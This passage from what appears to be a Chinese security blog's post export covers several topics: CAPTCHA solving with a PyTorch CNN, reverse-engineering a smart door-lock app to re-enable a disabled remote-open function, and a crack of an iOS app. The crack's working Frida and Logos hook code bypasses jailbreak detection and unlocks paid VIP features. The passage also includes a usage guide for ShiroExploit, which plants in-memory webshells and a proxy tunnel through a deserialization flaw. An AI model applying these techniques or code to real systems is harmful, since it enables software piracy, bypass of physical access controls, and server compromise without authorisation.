直接读为灰度图像 img1 = img[13:44, 28:52] #分割 cv2.imwrite(fname+\"_\"+getMd5()+\".jpg\", img1)def main(): names = os.listdir(\"MathCodes\") for name in names: corpImg(name) 从中挑选出噪点去除效果最好图片的作为模板，0 到 9 这 10 个数字各一个。 分别遍历这几个模板图片的像素点并存为 0-1 矩阵：首先创建一个 24列 31 行的二维数组（所有元素都为 0），遇到黑色像素点就将 0 变成 1，此处需要注意二维数组中坐标与像素点坐标是相反的。 12345678num_info = [([0] * 24) for i in range(31)] # 创建一个宽度为24，高度为31的二维数组pixdata = img.load()for y in range(31): for x in range(24): if pixdata[x, y] == 0: # print(x, y) num_info[y][x] = 1 # 注意二维数组中坐标是相反的num_info_list.append(num_info) 接下来就是识别了 123456789101112131415161718192021222324252627282930num_info_list = [] # 这个数组用以存储全部数字的 0-1 矩阵for i in range(10): filename = 'temp/'+str(i) + '.png' img = Image.open(filename) num_info = [([0] * 24) for i in range(31)] # 创建一个宽度为24，高度为31的二维数组 pixdata = img.load() for y in range(31): for x in range(24): if pixdata[x, y] == 0: # print(x, y) num_info[y][x] = 1 # 注意二维数组中坐标是相反的 num_info_list.append(num_info)img = Image.open('temp/067_1.jpg')img = binarizing(img,66)img.save(\"temp/01111.png\")count_list = [] # 记录当前图片像素信息与每一个 0-1 序列的匹配程度pixdata = img.load()for i in range(10): count = 0 for y in range(31): for x in range(24): if pixdata[x, y] == 0 and num_info_list[i][y][x] == 1: # 图片中黑色像素点出现的位置对应的矩阵点也是 1 count = count + 1 count_list.append(count)print(count_list)print('当前图片的识别结果：' + str(count_list.index(max(count_list)))) # 找到匹配数最大的那个元素的序号，而序号和数字是相同的。 从上面来看识别效果不是太好，所以后面就放弃了这种方法。 也可以先分割验证码，之后用ddddocr进行识别，中间的运算符可以采用上述的方法进行识别。这里就说一个思路，不具体实现了。一来比较麻烦，二来是运算符处理的效果也不会太好，但最终的结果会比直接分割识别这种方法好。 这是ddddocr识别效果，有一个没识别出来，不过准确率还挺高。 接下来就使用pytorch进行训练。 2.pytorch识别pytorch训练验证码的过程都差不多，这里从网上找了一套修改了一下。 样本已经有了，首先对验证码进行分析。验证码字符一共有16种，分别为： 10123456789+-×÷&#x3D;？ 验证码长度为5 12captcha_array &#x3D; list(&quot;0123456789+-×÷&#x3D;？&quot;)captcha_size &#x3D; 5 接下来就是Datasets数据加载。 pytorch有非常方便高效的数据加载模块Dataset和DataLoader。Dataset是数据样本的封装，可以很方便的读取数据。 实现一个Dataset的子类，需要重写__len__和__getitem__方法，__len__需要返回整个数据集的大小，__getitem__提供一个整数索引参数，返回一个样本数据（一个图片张量和一个标签张量）。主要代码如下： 12345678910111213141516171819202122232425class MyDataset(Dataset): def __init__(self, root_dir): super(MyDataset, self).__init__() self.image_path = [os.path.join(root_dir, image_name) for image_name in os.listdir(root_dir)] self.transforms = transforms.Compose( [ transforms.ToTensor(), transforms.Resize((60, 160)), transforms.Grayscale() # 灰色 ] ) def __len__(self): return self.image_path.__len__() def __getitem__(self, index): image_path = self.image_path[index] # print(image_path) image = self.transforms(Image.open(image_path)) ll = image_path.split(\"/\")[-1] ll = ll.split(\"_\")[0] #验证码文本 label_tensor = one_hot.text2Vec(ll) # [5,16] label_tensor = label_tensor.view(1, -1)[0] # [5*16] # print(label) return image, label_tensor 其中text2Vec是将验证码进行onehot编码，这里是变成一个5*16的数组。 主要代码: 12345def text2Vec(text): vec = torch.zeros(common.captcha_size, len(common.captcha_array)) for i in range(len(text)): vec[i, common.captcha_array.index(text[i])] = 1 return vec 比如说0×4=？转换的结果就如下： 12345tensor([[1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], # 0 [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1., 0., 0., 0.], # × [0., 0., 0., 0., 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], # 4 [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1., 0.], # &#x3D; [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1.]]) # ？ 对应的还原方法: 123456def vec2Text(vec): vec = torch.argmax(vec, dim=1) # 取最大值，不是0的取出来 text = '' for i in vec: text += common.captcha_array[i] return text DataLoader是Dataset的进一步封装，Dataset每次通过__getitem__方法取到的是一个样本，经过DataLoader封装为dataloader后，每次取的是一个batch大小的样本批次。 主要代码： 123456transform = transforms.Compose([transforms.ToTensor()]) # 不做数据增强和标准化了train_dataset = CaptchaData('./datasets/train/', transform=transform)train_data_loader = DataLoader(train_dataset, batch_size=32, num_workers=0, shuffle=True, drop_last=True)test_data = CaptchaData('./datasets/test/', transform=transform)test_data_loader = DataLoader(test_data, batch_size=128, num_workers=0, shuffle=True, drop_last=True) transforms是数据预处理操作，一般数据增强就通过transform实现，可以随机亮度，随机翻转，随机缩放等等。此处只使用了ToTensor()，将PIL.Image对象转换成Tensor。 训练采用了CNN神经网络，CNN主要由卷积层，池化层，激活函数组成，再加上一个BatchNorm，BatchNorm叫做批规范化，可以加速模型的收敛速度。 模型的主要代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Net(nn.Module): def __init__(self): super(Net, self).__init__() # 第一层神经网络 # nn.Sequential: 将里面的模块依次加入到神经网络中 self.layer1 = nn.Sequential( nn.Conv2d(3, 16, kernel_size=3, padding=1), # 3通道变成16通道，图片：60*160 nn.BatchNorm2d(16), nn.ReLU(), nn.MaxPool2d(2) ) # 第2层神经网络 self.layer2 = nn.Sequential( nn.Conv2d(16, 64, kernel_size=3), # 16通道变成64通道，图片：30*80 nn.BatchNorm2d(64), nn.ReLU(), nn.MaxPool2d(2) ) # 第3层神经网络 self.layer3 = nn.Sequential( nn.Conv2d(64, 128, kernel_size=3), # 64通道变成128通道，图片：14*39 nn.BatchNorm2d(128), nn.ReLU(), nn.MaxPool2d(2) ) # 第4层神经网络 self.fc1 = nn.Sequential( nn.Linear(13824, 1024), nn.Dropout(0.2), # drop 20% of the neuron nn.ReLU() ) # 第5层神经网络 self.fc2 = nn.Linear(1024, common.captcha_size * common.captcha_array.__len__()) # 5:验证码的长度， 16: 字母列表的长度 # 前向传播 def forward(self, x): x = x.to(device) x = self.layer1(x) x = self.layer2(x) x = self.layer3(x) x = x.view(x.size(0), -1) x = self.fc1(x) x = self.fc2(x) return x nn.Sequential()可以看作模块的有序容器，可以方便快捷的搭建神经网络。网络的输入是一个shape为[batch, 3, 60, 180]的张量，batch代表的是一个批次图片数量，3代表输入的图片是3通道的，即RGB，180和60则分别代表图片的宽和高。 经过上结构的卷积后，得到一个shape为[batch, 128, 6, 18]的张量，x.view(x.size(0), -1)将改变张量的shape为[batch, 128*6*18]，再用一个[1024, 16*5]的全连接层映射为一个[batch, 16*5]张量，这个就是模型的输出，其中16代表字符的种类数量，5代表一张验证码图片含有的字符数量。 接下来就是验证码的训练了： 这里使用的是CPU进行训练的，训练样本生成了2000张，测试样本200张，刚开始训练准确率就可以到100%，而且速度不是太慢。 验证码生成的脚本：https://github.com/fupinglee/Calculate_Captcha 如果是在GPU下训练，在CPU下使用模型时，需要进行转换： torch.load(model_path, map_location=torch.device(&#39;cpu&#39;)) 训练后测试的结果（200张测试准确率是100%，又另外生成了2000张验证码进行测试）： 经过测试，使用pytorch训练的准确率可以达到99%。 完整代码：https://github.com/fupinglee/CalculateCaptcha_Recognition 0x03 总结本文通过2种方法来对计算验证码进行识别。第一种方法使用简单，但识别率较低，可以针对一些比较简单的验证码（比如验证码未进行扭曲、干扰等）。第二种方法使用简单，但识别率比较依赖样本的数量，前期验证码标注是一件麻烦事，但对于本文这种简单的验证码，少量的样本准确率也会很高。 0x04 参考1.自动识别验证码破解上学吧题目答案 2.pyTorch – 图形验证码识别 3.验证码代码 4.pytorch识别验证码代码","tags":"验证码识别 计算验证码 pytorch 若依验证码"},{"title":"当快捷指令遇上智能门锁","url":"/2021/02/04/IOS-ShortCut-And-Smart-Lock/","text":"0x01 前言前段时间朋友小区换了一个智能门禁系统，户主通过一个APP进行管理，可以远程进行开锁操作。刚好这段时间在使用IOS的快捷指令操作，于是想做一个一键开门的快捷指令，直接通过快捷指令来完成开门的操作。 0x02 逆向分析首先打开APP进行抓包，发现参数中有一个加密的sign值。 sign值与其他参数都有关系，修改其他参数会提示签名验证失败，而且时间久了该数据包不可用，提示时间不正确，请调整时间。 于是接下来对APP进行逆向，分析sign值是如何生成的。APP是从APPStore上下载的，首先第一步先进行砸壳。 数据线连接越狱的手机，打开app，执行frida-ps -Ua,查看Identifier 123456frida-ps -Ua PID Name Identifier---- ------ --------------------1823 xx生活 com.xx.xxlife1808 微信 com.tencent.xin1190 邮件 com.apple.mobilemail 使用frida-ios-dump砸壳 123iproxy 2222 22cd frida-ios-dump //在dump.py中配置好账号信息python3 dump.py com.xx.xxlife//砸壳 解压得到的ipa文件，使用IDA打开Mac-O文件，在Strings window搜索appUser/login 找到后查找引用 继续查找 发现在+[LoginViewModel login:password:success:failure:]方法中调用了。 双击进入-[RequestManager POST_URLString:parameters:showIndicatior:success:failure:]方法， 在该方法中调用了-[RequestManager RSAWithDic:]方法，根据方法名可以猜出该方法是对参数进行了RSA加密。 打开-[RequestManager RSAWithDic:]方法 发现参数sign是由其他参数进行RSA加密获得的。查看加密的参数格式的话可以通过frida-trace进行hook查看。 可以对-[RequestManager convertToString:]方法或者+[RSAUtil encryptString:publicKey:]方法进行hook。 查看-[RequestManager convertToString:]方法的参数与返回值，执行 1frida-trace -U -f com.xx.xxlife -m \"-[RequestManager convertToString:]\" Ctrl-C 停止运行，修改convertToString_.js 123456789&#123; onEnter(log, args, state) &#123; log(`-[RequestManager convertToString:$&#123;args[2]&#125;]`); log(ObjC.Object(args[2])); &#125;, onLeave(log, retval, state) &#123; log(ObjC.Object(retval)); &#125;&#125; 再次运行，可以看到参数与返回值 查看+[RSAUtil encryptString:publicKey:]方法的参数与返回值，执行： 1frida-trace -U -f com.xx.xxlife -m \"+[RSAUtil encryptString:publicKey:]\" 由上面的hook可以看到加密的参数格式以及RSA的public key，接下来进行验证一下。 这里有一个问题，当使用该public key进行加密时，当加密的数据长度大于117时，会报错。 解决的方法是对加密的数据根据长度117进行分割，使用rsa加密后拼接，最后返回拼接后的数据。 修改后可以成功登录，接下来是一键开门的操作。 当使用一键开门的功能时提示该小区未开启一键开门功能 之前是可以使用该功能的，可能由于有业主频繁的开门，物业怕影响正常的使用，后来该功能就不可用了。 根据关键字定位到sub_1000B5978函数 发现是否开启一键开门功能是根据isClickOpen来判断的，当该值不为2时可以使用该功能。在操作APP的时候可以发现返回值中有isClickOpen，通过拦截数据包修改该值为非2的值，如修改为1。 再次使用一键开门功能可以正常使用。该功能发送的请求： 123456789101112POST /xxxxApi/userCommunity/IsOpenDoor HTTP/1.1Host: xxxxapp.xxxxxxx.comContent-Type: application/x-www-form-urlencodedConnection: closeAccept: */*User-Agent: PerfectLife/3.01.0 (iPhone; iOS 12.4.1; Scale/2.00)Accept-Language: zh-Hans-CN;q=1Content-Length: 545Accept-Encoding: gzip, deflateaccessToken=84379_2eb78c1f6249447a9922039f35fc1fd7&amp;applicationType=2&amp;deviceType=2&amp;houseId=xxxxx&amp;sign=ZkZMPY2OHqCWlW4s%2BXfKFs3pmMfMbO95nGZVex/j7ci2jIakkS8J8wAnq%2BcjRygDI/vsuxPgz/SNRHRXlkzoGcqyglE483PDMbVzYBdtnLtrWFmEl/APAepcgT/Vsap7kr5vhjyf73HsAMFRwd0jKLnhX/Qy04l3FIMlvEs9mW1t7FGEkfRTuCpqz8cz%2B8Db4u8h8HOvyYS1SQiKNene0gdGztNxkFGayf1hPjPOWbSCpdQ9NbkPJ/4vSrGO%2B5HfB8umHvFYeamtByHdwiQsnfzMKcFuw4fGfG6nU35xBOsS1hY%2BWyeMh6/%2BPkXW%2BcyqWjT%2BssTp5F7IZhVibF/zcA%3D%3D&amp;terminalCode=865xxxx&amp;timestamp=1611820323000&amp;version=3.01.0&amp;versionCode=3010 其中参数houseId是户主的房屋id，是固定值，与登录的用户有关。可以通过接口appUserHouse/getHouseAndFocusList获取。 参数terminalCode是小区门的编码，该值可能会变化，可以通过接口door/list获取。 返回的内容 然后就可以利用代码实现一键开门的操作 为了不影响正常使用，这里仅获取houseId与terminalCode，不进行开门操作。 接下来就是快捷指令的编写，实现一键控制。 0x03 快捷指令编写如果结合其他APP或者借助其他平台的话很容易就可以编写快捷指令，如可以使用Pythonista(需付费下载)，复制上面的python脚本，直接通过快捷指令调用，也可以通过快捷指令登录SSH运行脚本(需要有服务器)。 但对于普通用户来说这种操作不易实现（需要一定的成本），这里采取了一种稍微繁琐的方法，但都尽量采用快捷指令来实现（或者借助免费的应用来实现）。 以登录过程为例，进行快捷指令的编写。 登录过程所需的参数： 参数名称 说明 accessToken 登录时为空 applicationType 当前环境下固定值2 deviceType 当前环境下固定值2 password 密码 phone 手机号 sign 对其他参数进行RSA加密获取 timestamp 当前时间的时间戳 version 当前版本3.01.0 versionCode 当前版本3010 其中时间戳和RSA加密的sign值需要去获取，获取时间戳可以通过快捷指令来实现。 RSA加密的话，本来可以借助在线平台来实现，但是由于使用该APP的Public key进行加密时，待加密字符串长度大于117时会报错。 使用截取字符串的话快捷指令没有截取文本，只有一个根据条件拆分字符，所以这里打算借助其他APP通过执行JavaScript脚本来实现。这里采用的APP是JSBOX，虽然该APP有很多功能，但是都需要高级版才可以使用。不过免费版可以通过快捷指令来执行JavaScript脚本。 JS实现RSA加密可以使用jsencrypt ，主要代码： 12345678910111213141516171819/**省略jsencrypt代码**/var PUBLIC_KEY = 'MIGfMA0GCSqGSI......7nNQIDAQAB';var encrypt = new JSEncrypt();encrypt.setPublicKey('-----BEGIN PUBLIC KEY-----' + PUBLIC_KEY + '-----END PUBLIC KEY-----');var str = '待加密字符串';var divide = parseInt(str.length / 117);if (divide &gt; 0)&#123;divide=divide;&#125; else divide=divide + 1;var line = divide ;if(str.length % 117 != 0)&#123; line = divide + 1;&#125;var encrypted = '' ;for(var i = 0;i&lt;line ;i++)&#123; encrypted += b64tohex(encrypt.encrypt(str.substring(i*117,(i+1)*117)));&#125;var result = hex2b64(encrypted);result; RSA加密的快捷指令 这样借助JSBOX运行JavaScript来实现RSA加密就完成了，剩下的就好做了。 一个快捷指令可以看作是程序里的一个函数，可以在其他快捷指令中来调用。使用快捷指令的的登录过程如下： 登录成功返回accessToken，然后在其他操作中需要使用该token。其他的操作都类似，先在快捷指令中调用登录，然后请求相关的api即可。如开门的快捷指令如下： 使用的话可以直接点击开东门的快捷指令，或者使用语音嘿Siri，开东⻔来开启小区入口门。开启其他大门类似，修改对应的terminalCode即可。 给别人使用的话也很简单，通过快捷指令Backup Shortcuts To iCloud将所需的快捷指令共享给别人，然后下载JSBOX即可使用。 0x04 总结本文通过快捷指令实现了一个”智能开门”指令，快捷指令实现起来比较简单，但是功能有限制，有些功能需要借助一下其他的APP或者平台才能实现，本文为了大众化才采用了比较繁琐的方法来实现，如果是自己使用的话当然是怎么方便怎么来。","tags":"ios逆向 快捷指令"},{"title":"IOS逆向初探","url":"/2020/12/16/IOS-APP-tomatodo-Cracked/","text":"0x00 前言本文记录了某次逆向一个简单APP的过程，来简单介绍一下IOS逆向的流程，比较基础，属于入门级教程。包括砸壳、HOOK、插件的编写等一系列流程。 0x01 背景前段时间在一个老师那里看到一群考研人的打卡信息，该APP能够详细的记录和分析学习过程。 于是就下载试用了一下。但是免费版有许多的限制。如免费版的话仅可以添加2个”习惯”类代办， 使用背景图也是需要开通季度卡的（虽然并没什么用）。 手机上打开”季度卡”页面，由于手机经过了越狱，在开通的时候提示非常抱歉，由于Apple的安全策略，暂不支持越狱用户购买，可点击右上角获取帮助-其他问题联系我们解决。 虽然免费版不影响正常使用，但是本着学习的态度想查看一下其越狱检测的绕过，结果发现竟然可以白嫖使用VIP功能。 0x02 逆向分析IOS下逆向常规操作判断该APP是否加壳(加密)，有壳的话先进行砸壳，然后利用IDA或者Hopper对脱壳后的Mach-O文件进行分析。首先需要准备一下环境和工具。 1.准备工作手机设备：一台越狱的IOS手机，版本为12.4.1，安装了OpenSSH和Frida，Frida版本为14.1.3。 逆向分析工具：IDA或者Hopper。 开发工具：Xcode。 抓包工具：BurpSuite 或者Charles。 电脑上安装Frida版本为14.1.3。 由于是APPStore下载的APP，是经过了加壳的。接下来开始对该APP进行砸壳。 2. 砸壳砸壳的脚本有很多，如frida-ios-dump、dumpdecrypted、Clutch、yacd等，这里采用的工具是frida-ios-dump。 安装方法： 123git clone https://github.com/AloneMonkey/frida-ios-dumpcd frida-ios-dumppip install -r requirements.txt --upgrade 安装完成所需的依赖后打开dump.py进行配置。 12345User = 'root'Password = 'alpine'#默认的密码Host = 'localhost'Port = 2222 #根据自己的端口进行修改KeyFileName = None 使用方法: python3 dump.py APP名字 或者python3 dump.py Bundle identifier 将手机与电脑连接，打开APP，执行frida-ps -Ua,查看APP名字和Identifier。 1234frida-ps -Ua PID Name Identifier---- ------ --------------------7312 APP名字 com.xxxx.tomatodo 然后进行砸壳 12iproxy 2222 22python3 dump.py com.xxxx.tomatodo 也可以执行python3 dump.py APP名字进行砸壳 砸了壳后提取出TomatoTime可执行文件，扔到IDA或者Hopper里面分析。 3.分析根据关键文字进行搜索，这里搜索的是”越狱”。由于Mac上的IDA7.0搜不出来中文字符，所以可以使用Hopper搜索，找到函数位置后使用IDA打开。也可以全程使用Hopper进行分析。 使用hopper搜索”越狱”字符串 发现是在方法startPay:中 找到后可以继续使用Hopper进行分析，或者在IDA中分析，我在这里采用了IDA。 直接在函数中搜索-[SeasonCardController startPay:]。 发现是该APP判断是否越狱，是根据是否存在Cydia来进行判断的。当/Applications/Cydia.app文件存在时，则提示用户越狱。 绕过这种越狱检测的方法也很简单，直接进行Hook fileExistsAtPath:方法即可。当判断/Applications/Cydia.app文件存在时将返回值改为0，即可绕过这里的越狱判断。 4. 越狱绕过根据上面的分析，开始对-[NSFileManager fileExistsAtPath:]进行Hook。 代码如下： 1234567891011121314151617181920var jailbreakPaths = [\"/Applications/Cydia.app\"];var isJailBreakChecked = falseInterceptor.attach(ObjC.classes.NSFileManager[\"- fileExistsAtPath:\"].implementation, &#123; onEnter: function (args) &#123; isJailBreakChecked = false; this.path = new ObjC.Object(args[2]).toString(); // check if the looked up path is in the list of common_paths if (jailbreakPaths.indexOf(this.path) &gt; -1) &#123; console.log(\"fileExistsAtPath: check for -&gt; \" + this.path); isJailBreakChecked = true; &#125; &#125;, onLeave: function (retval) &#123; if (!isJailBreakChecked) &#123; return; &#125; console.log(\"change before:\"+retval); retval.replace(0);//当判断/Applications/Cydia.app文件存在时将返回值改为0 console.log(\"change after:\" + retval); &#125;&#125;); 执行方法： 1frida -U -l tomatodo-jailbreak-bypass.js -f com.xxxx.tomatodo --no-pause 此时再次打开APP，可以成功进入季度卡开通界面。 当然也可以使用objection进行绕过越狱检测。 使用方法 1objection -g &quot;com.xxxx.tomatodo&quot; explore --startup-command &quot;ios jailbreak disable&quot; 也是可以成功绕过越狱检测的。 5.Vip功能绕过在-[SeasonCardController startPay:]方法中有第53行这样一个判断，根据意思应该是判断是否激活。 根据上面的代码，猜测+[CommonUtil isActive]的结果是判断是否开通了季度卡的依据。在这里使用frida-trace进行追踪，frida-trace 用于跟踪函数或者 Objective-C 方法的调用，-m 跟踪某个 Objective-C 方法。 使用方法： 1frida-trace -U -f com.xxxx.tomatodo -m \"+[CommonUtil isActive]\" 它会在当前目录下生成一个 __handlers__目录，然后在目录下生成一个 类名/方法名.js 文件，这里的文件名为/CommonUtil/isActive.js。当在调用该方法时，会输出以下信息，按 Ctrl-C 可以停止跟踪。 打开生成的js文件会看到有两个函数，onEnter 是进入该函数时会执行的代码，onLeave 是该函数执行完离开时会执行的代码。在这里直接修改返回值retval为1。其代码如下： 12345678910&#123; onEnter(log, args, state) &#123; log(`+[CommonUtil isActive]`); &#125;, onLeave(log, retval, state) &#123; console.log(\"change before:\"+retval); retval.replace(1); console.log(\"change after:\"+retval); &#125;&#125; 再次执行 frida-trace，/CommonUtil/isActive.js 文件不会覆盖，会执行刚才添加好的代码，如下： 此时发现不仅可以使用季度卡背景 而且也可以可以添加多个习惯类代办 其实并不是，在测试的时候由于没有注意，添加了两个习惯和一个目标，导致认为通过hook +[CommonUtil isActive]方法可以解锁全部的VIP功能，一直到后来写插件的时候才发现该错误，在编写非越狱插件时有详细的分析。 所以通过hook方法 +[CommonUtil isActive]可以实现到VIP功能的使用。 但这些都是在越狱手机上使用的，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。 0x03 编写非越狱插件编写插件采用了非越狱插件开发集成神器MonkeyDev，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。 安装和卸载可以参考https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85 安装完成后新建MonkeyApp 输入项目名称 项目建立后将砸壳后的APP拖入到TargetApp目录下。 这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法： 123456%hook 类名- (返回值)方法名:(id)arg1 ....&#123; ...&#125;%end 这里我们需要对CommonUtil 类的方法isActive进行HOOK，修改返回值，代码如图所示。 连接非越狱手机后使用⌘+R运行该项目，手机上会多出来一个名字一样的APP。理论上来讲该APP可以使用其VIP功能。 首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书。 然而此时只能使用VIP的部分功能，可以使用会员背景，但是无法添加超过2个习惯和目标类代办。此时才发现在使用frida进行hook的时候，测试添加多个习惯类代办时添加了两个习惯，一个目标，因此给出了可以使用全部VIP功能的结论。 通过关键字定位到-[AddTodoController confirm]方法。 发现添加超过2个习惯和目标类代办需要判断GVUserDefaults的isActive是否为真。 而且查看+[CommonUtil isActive]方法，其返回结果也是获取的GVUserDefaultsisActive属性的值。 对+[GVUserDefaults standardUserDefaults]进行hook，修改其isActive属性。 代码如下： 1234567891011121314@interface GVUserDefaults : NSObject@property(nonatomic) _Bool isActive;@end%hook GVUserDefaults+ (id)standardUserDefaults&#123; GVUserDefaults *gvUser = %orig(); NSLog(@\"GVUserDefaults isActive old----&gt;%d\",[gvUser isActive]); [gvUser setIsActive:true]; NSLog(@\"GVUserDefaults isActive new----&gt;%d\",[gvUser isActive]); return gvUser;&#125;%end 执行结果 此时可以使用超过2个习惯和目标类以及使用全部的背景功能。 0x04 总结本文通过一个简单的APP逆向，实现了越狱绕过以及解锁VIP会员功能。简单的介绍了一下相关工具的使用。关于越狱绕过，该APP越狱检测的方法很简单，只是判断了文件是否存在。其他检测的方式有：可以尝试读取系统所有的应用名称列表，看有无权限获取；检测stat是否出自系统库等。更多检测方式可以参考iOS开发-安全相关-越狱检测 。 对于该APP使用体验来讲，免费版功能已经够用了，而且无广告，如果有需要的可以开通季度卡，解锁更多功能。","tags":"ios逆向 frida"},{"title":"ShiroExploit使用指南","url":"/2020/11/27/ShiroExploit-Readme/","text":"0x01 简介一款关于Shiro 1.2.4反序列化漏洞利用的回显工具。最新版本为v2.4。 v2.4与v2.3相差不大，使用v2.3即可。 v2.3下载地址：https://github.com/fupinglee/JavaTools/blob/master/Shiro/ShiroExploit-v2.3.jarv2.3使用说明：https://github.com/fupinglee/JavaTools/blob/master/Shiro/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E-v2.3.pdf 支持： 1.支持Tomcat7、Tomcat8、Tomcat9下的回显。 2.支持Tomcat7、Tomcat8、Tomcat9下内存cmd马的写入与卸载。 执行成功访问的URL为http://ip:port/xxx?labCmd=[命令]&amp;pwd=[密码]。 3.支持Tomcat7、Tomcat8、Tomcat9下蚁剑内存shell的写入与卸载(请用蚁剑连接，连接类型CUSTOM)。 执行成功后连接的URL为http://ip:port/xxx?ver=[任意字符串]。 4.支持Tomcat7、Tomcat8、Tomcat9下冰蝎内存shell的写入与卸载(请用蚁剑连接，连接类型JSP)。 执行成功后连接的URL为http://ip:port/xxx。 5.新增配置中心，支持自定义UA和x-forwarded-for；新增内存代理Tunnel，新增AES-GCM加密方式的支持，新增一键卸载所有内存SHELL。 以上发送请求时均需带上自定义的header：Accept-Header:[自定义的Accept-Header内容] 下面具体说一下各个功能的使用方法，主要是介绍命令执行的使用方法。 0x02 使用说明一共有三个功能模块，分别是KEY检测、命令执行和配置中心。 KEY检测 这一部分功能说明可以参考https://github.com/fupinglee/ShiroScan。 新增AES-GCM加密方式。 命令执行命令执行中一共有回显、内存shell和卸载这三块。 回显输入正确的key，选择正确的Gadget即可。支持Tomcat6、7、8、9以及SpringBoot下的通用回显。 内存shell这个一共有6个选择，分别是CMDSHELL、EvilObject、[蚁剑]蚁剑SHELL、[蚁剑]冰蝎SHELL、[蚁剑]冰蝎SHELL[SpringBoot]、Tunnel。 常用的有CMDSHELL、[蚁剑]蚁剑SHELL、[蚁剑]冰蝎SHELL、[蚁剑]冰蝎SHELL[SpringBoot]、Tunnel 5个，EvilObject在这里只是为了写入蚁剑SHELL和Tunnel而用的，暂时没有单独使用的机会，所以这里就不对其进行功能介绍了。 内存Shell都是采用的Filter，因此连接或者使用时，可以使用任意路径，只需配置好指定的Header与密码。 1.CMDSHELL 可以自定义密码和请求头，都是必须的。 保存完毕后点击开始按钮。 执行的效果： 只有在密码、和header都正确且存在的情况下，才会执行命令，否则返回正常的页面。 2.[蚁剑]蚁剑shell 输入密码和Header保存后点击开始按钮，会将蚁剑Shell Filter加载进去 使用蚁剑连接 一共有三个需要注意的地方。 1.URL中需要有ver参数 2.连接类型为CUSTOM 3.需要添加Header，Name为Accept-Header，Value是自己设置的值 这三个都需要且正确，否则会连接不成功。 3.[蚁剑]冰蝎shella)Tomcat环境下 输入密码和Header保存后点击开始按钮，会将冰蝎Shell Filter加载进去 这里的话需要使用新版的蚁剑来连接，冰蝎是无法连接此shell的，所以类型为[蚁剑]冰蝎SHELL。 不过最新版的蚁剑也是无法连接的，需要自己从https://github.com/AntSwordProject/antSword 下载代码，然后覆盖到自己的蚁剑目录才可以，作者已经更新了代码，但是还没有发布，需要自己下载后替换文件即可。 连接冰蝎shell也需要注意三点。 1.需要从github下载代码替换蚁剑客户端 2.连接类型为JSP 3.需要添加Header，Name为Accept-Header，Value是自己设置的值 否则也是无法连接的，这里就不演示了。 b)SpringBoot环境下支持回显与冰蝎shell 连接时需要利用修改的蚁剑模版 123git clone https:&#x2F;&#x2F;github.com&#x2F;fupinglee&#x2F;AntSword-JSP-Templatecd AntSword-JSP-Template.&#x2F;build.sh https://github.com/AntSwordProject/AntSword-JSP-Template/pull/1 然后将dist下的文件替换 AntSwordData/antSword-master/source/core/jsp/template 中的文件，然后重启蚁剑客户端。 修改前连接500错误 修改后正常连接 蚁剑连接 4.Tunnel内存代理shell。 这里就不需要密码了，因此密码框是无法编辑的。 注意这里是Cache-Header 使用原版的reGeorgSocksProxy.py是无法连接的。 需要加上自定义的Cache-Header，这里是&quot;Cache-Header&quot;:&quot;thisIsMyJob!@&quot;。 也可以直接使用https://github.com/fupinglee/MyPython/blob/master/tools/reGeorgSocksProxy_MMShell.py 注意使用时需要替换自己的Cache-Header的值。 修改后运行 卸载卸载的意思就是将Filter移除掉。 这里用cmdshell为例 选择类型后确定，然后点击开始按钮 cmdshell即被卸载 新增了一键卸载的命令。 会一次将所有写入的内存shell都给卸载。 更新密码如何更新shell密码 仍以cmdshell为例，其他的一样的操作，都是重新加载一次内存shell即可。 首先加载一个cmdshell 修改密码是选择内存shell，然后选择shell类型，输入密码和自定义的header 修改密码为cmd2,原来的密码已经失效了 新的密码可以执行命令。 配置中心 配置中心可以使用代理和自定义UA、X-Forwarded-For，保存后立即生效。 在两次实例中遇到了通过修改UA或X-Forwarded-For绕过限制执行命令的情况，因此增加了这个功能。 0x03 其他仅供安全人员进行有授权的验证,勿用于非法测试。","tags":"shiro反序列化回显工具 内存shell"},{"title":"自动化测试工具Appium初探","url":"/2020/05/29/Test-Automation-Using-Appium/","text":"0x01 前言前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成0000~9999的密码字典，应该就可以找到正确的密码。 经搜索发现，IOS自动化的框架有很多，如UIAutomation、XCTest、KIF、APPium等。其中UIAutomation和APPium无需源码就可以进行测试，而且APPium支持多种语言，所以这里我选择了APPium。 0x02 环境搭建与自动化测试Appium相关介绍Appium 是一个开源工具，用于自动化 iOS 手机、 Android 手机和 Windows 桌面平台上的原生、移动 Web 和混合应用。 它使用WebDriver协议驱动iOS，Android和Windows应用程序。Appium 是跨平台的：它允许用同样的 API 对多平台（iOS、Android、Windows）写测试，做到在 iOS、Android 和 Windows 测试套件之间复用代码。而且支持多种语言，java、python、php、Ruby等等。 我这里是在MacOS系统下进行的测试，采用了手机版本为13.5.1（IOS真机），开发语言选择了Python3.8。 下面就开始搭建环境进行测试吧。 首先是APPium的安装。 APPium相关安装如果没有安装Homebrew，则需要先安装Homebrew。 1/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\" 安装node 1brew install node 安装相关依赖与软件 12345678910111213npm install -g appium # 安装appiumnpm install wdnpm install -g appium-doctornpm i -g mjpeg-consumerbrew install ios-deploybrew install carthagebrew install lyft/formulae/set-simulator-locationnpm i -g opencv4nodejsbrew tap facebook/fbbrew install idb-companionpip install fb-idbbrew tap wix/brewbrew install applesimutils 安装的话根据可以参考http://appium.io/docs/en/about-appium/getting-started/ 进行安装。 也可以直接安装appium桌面程序https://github.com/appium/appium-desktop/releases 。 